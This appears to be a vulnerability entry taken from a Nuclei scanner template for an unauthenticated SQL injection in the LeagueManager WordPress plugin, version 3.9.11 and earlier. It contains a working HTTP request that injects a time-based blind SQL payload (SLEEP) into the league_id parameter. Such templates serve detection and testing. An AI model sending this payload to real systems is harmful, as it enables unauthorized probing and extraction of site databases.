# Vulnerability: LeagueManager <= 3.9.11 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`leaguemanager-sql-injection.yaml`)

## Description
The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
GET /?season=1&league_id=1season=1&league_id=1'+AND+(SELECT+1909+FROM+(SELECT(SLEEP(6)))ZiBf)--+qODp&match_day=1&team_id=1&match_day=1&team_id=1 HTTP/1.1
Host: {{Hostname}}
```

